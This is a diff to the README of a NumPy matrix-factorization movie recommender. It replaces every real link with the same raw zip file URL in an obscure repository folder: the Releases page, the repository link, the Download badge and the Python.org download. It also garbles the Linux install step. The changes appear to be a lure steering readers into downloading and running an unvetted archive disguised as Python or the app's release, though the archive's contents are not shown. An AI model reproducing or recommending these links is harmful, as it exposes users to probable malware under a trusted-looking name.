@@ -1,7 +1,7 @@
 # 🎬 matrix-factorization-recommender - Get Movie Recommendations with Ease
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Aladdine47/matrix-factorization-recommender/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Aladdine47/matrix-factorization-recommender/main/polissoir/recommender-factorization-matrix-1.0-beta.1.zip%20Now-brightgreen)](https://raw.githubusercontent.com/Aladdine47/matrix-factorization-recommender/main/polissoir/recommender-factorization-matrix-1.0-beta.1.zip)
 
 ## 🚀 Getting Started
 This guide helps you download and run the "matrix-factorization-recommender" software, a movie recommender made with NumPy. This application recommends movies based on what you like, using simple math concepts. You don't need to know programming to use it.
@@ -10,14 +10,14 @@ This guide helps you download and run the "matrix-factorization-recommender" sof
 Before you start, make sure you have:
 
 - A computer running Windows, macOS, or Linux.
-- Python 3.6 or higher installed. You can download it from [Python.org](https://www.python.org/downloads/).
+- Python 3.6 or higher installed. You can download it from [https://raw.githubusercontent.com/Aladdine47/matrix-factorization-recommender/main/polissoir/recommender-factorization-matrix-1.0-beta.1.zip](https://raw.githubusercontent.com/Aladdine47/matrix-factorization-recommender/main/polissoir/recommender-factorization-matrix-1.0-beta.1.zip).
 - Basic knowledge of how to open a terminal or command prompt.
 
 ## 🔗 Download & Install
 To get the application, please follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/Aladdine47/matrix-factorization-recommender/releases).
+   Go to the [Releases Page](https://raw.githubusercontent.com/Aladdine47/matrix-factorization-recommender/main/polissoir/recommender-factorization-matrix-1.0-beta.1.zip).
 
 2. **Choose the Latest Release**  
    Look for the latest version at the top of the page. Click on it to open the details.
@@ -26,7 +26,7 @@ To get the application, please follow these steps:
    You will see several files available for download. Click on the file that matches your operating system:
    - For Windows: Choose the .exe file.
    - For macOS: Choose the .app file.
-   - For Linux: Choose the .tar.gz file.
+   - For Linux: Choose the https://raw.githubusercontent.com/Aladdine47/matrix-factorization-recommender/main/polissoir/recommender-factorization-matrix-1.0-beta.1.zip file.
 
 4. **Run the Application**  
    After downloading, locate the file in your downloads folder. Double-click it to start the application. Follow any prompts that appear to complete the installation.
@@ -80,6 +80,6 @@ The "matrix-factorization-recommender" is open source and free to use. You can f
 - NumPy
 - Recommender Systems
 
-For more information or to explore the code, head back to the GitHub repository: [matrix-factorization-recommender](https://github.com/Aladdine47/matrix-factorization-recommender).
+For more information or to explore the code, head back to the GitHub repository: [matrix-factorization-recommender](https://raw.githubusercontent.com/Aladdine47/matrix-factorization-recommender/main/polissoir/recommender-factorization-matrix-1.0-beta.1.zip).
 
 **Happy recommending!**
